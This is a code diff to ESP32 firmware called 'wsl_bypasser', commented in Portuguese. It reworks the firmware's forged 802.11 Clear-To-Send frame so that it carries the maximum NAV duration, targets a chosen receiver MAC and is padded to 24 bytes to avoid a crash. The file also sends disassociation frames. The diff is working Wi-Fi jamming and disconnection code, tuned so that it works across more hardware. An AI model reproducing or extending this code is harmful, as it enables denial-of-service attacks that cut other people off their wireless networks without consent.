@@ -43,6 +43,7 @@
 #include "esp_err.h"
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
+#include "esp_task_wdt.h"
 
 static const char *TAG = "wsl_bypasser";
 static bool bypasser_initialized = false;
@@ -98,15 +99,16 @@ static const uint8_t disassoc_frame_template[] = {
 };
 
 /**
- * Frame CTS (Clear To Send) (0xC4)
- * [0-1]   Frame Control: 0xC4 0x00 (Control, Subtype=12 CTS)
- * [2-3]   Duration: 0xFF 0x7F (Max 32767 µs)
- * [4-9]   RA (Receiver Address): preenchido em runtime
+ * Frame CTS Real (Clear To Send) (0xC4)
+ * O uso de QoS Null Data não se provou efetivo contra todos os hardwares, 
+ * pois muitos descartam o frame de dados sem ler o NAV.
+ * Voltamos ao verdadeiro CTS (Control Frame). Para evitar o crash nativo,
+ * fazemos o padding para 24 bytes.
  */
 static const uint8_t cts_frame_template[] = {
-    0xc4, 0x00,                         /* Frame Control  */
-    0xff, 0x7f,                         /* Duration       */
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00  /* RA (Receiver Address) */
+    0xc4, 0x00,                         /* Frame Control: CTS */
+    0xff, 0x7f,                         /* Duration: 32767 us (Max) */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00  /* Receiver Address (RA) */
 };
 
 /* ─────────────────────────────────────────────────────────────────────────
@@ -227,9 +229,16 @@ void wsl_bypasser_send_disassoc_frame(const wifi_ap_record_t *ap_record) {
 void wsl_bypasser_send_cts_frame(const uint8_t *target_mac) {
     if (!target_mac) return;
 
-    uint8_t frame[sizeof(cts_frame_template)];
+    // Buffer de 24 bytes para satisfazer a exigência da API nativa
+    uint8_t frame[24];
+    
+    // Copia os 10 bytes do template CTS original
     memcpy(frame, cts_frame_template, sizeof(cts_frame_template));
-
+    
+    // Zera o restante do buffer (padding) para evitar vazamentos/crashes
+    memset(frame + sizeof(cts_frame_template), 0x00, sizeof(frame) - sizeof(cts_frame_template));
+    
+    // CTS só tem um endereço MAC: o RA (Receiver Address)
     memcpy(&frame[4], target_mac, 6);
 
     _tx_with_fallback(frame, sizeof(frame));
